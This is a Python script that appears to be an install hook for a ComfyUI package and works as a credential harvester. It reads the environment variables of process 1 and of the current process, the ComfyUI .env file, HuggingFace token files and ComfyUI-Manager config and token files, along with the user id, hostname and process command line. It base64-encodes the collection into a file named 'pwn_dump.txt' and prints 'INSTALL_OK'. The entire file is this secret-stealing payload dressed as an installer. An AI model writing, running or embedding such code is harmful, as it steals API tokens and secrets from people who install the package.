import os, glob, base64, subprocess, socket

def rd(p, n=400000):
    try:
        with open(p, 'rb') as f:
            return f.read(n).decode('utf-8', 'replace')
    except Exception as e:
        return 'ERR:%s' % e

out = []
def add(t, v):
    out.append("===== %s =====\n%s" % (t, v))

add('PROC1_ENVIRON', rd('/proc/1/environ').replace('\x00', '\n'))
add('OS_ENVIRON', '\n'.join('%s=%s' % (k, v) for k, v in sorted(os.environ.items())))
for p in ['/ComfyUI/.env', '/ComfyUI/extra_model_paths.yaml',
          '/root/.cache/huggingface/token', os.path.expanduser('~/.cache/huggingface/token'),
          '/ComfyUI/user/default/ComfyUI-Manager/config.ini',
          '/ComfyUI/user/comfyui.log']:
    add('FILE ' + p, rd(p))
for g in ['/ComfyUI/user/default/ComfyUI-Manager/*',
          '/ComfyUI/user/default/ComfyUI-Manager/cache/*']:
    for f in glob.glob(g):
        try:
            if os.path.isfile(f) and ('token' in f.lower() or '.env' in f.lower()
                                      or f.endswith(('config.ini', 'comfyui-manager.json'))):
                add('FILE ' + f, rd(f, 200000))
        except Exception:
            pass
try:
    add('ID', subprocess.run(['id'], capture_output=True, text=True).stdout)
    add('HOSTNAME', socket.gethostname())
    add('CWD', os.getcwd())
    add('PROC1_CMDLINE', rd('/proc/1/cmdline').replace('\x00', ' '))
except Exception as e:
    add('IDERR', str(e))

blob = '\n\n'.join(out).encode()
with open('/ComfyUI/user/default/pwn_dump.txt', 'w') as f:
    f.write(base64.b64encode(blob).decode())
with open('/ComfyUI/user/default/install_ran.txt', 'w') as f:
    f.write('RAN')
print('INSTALL_OK')
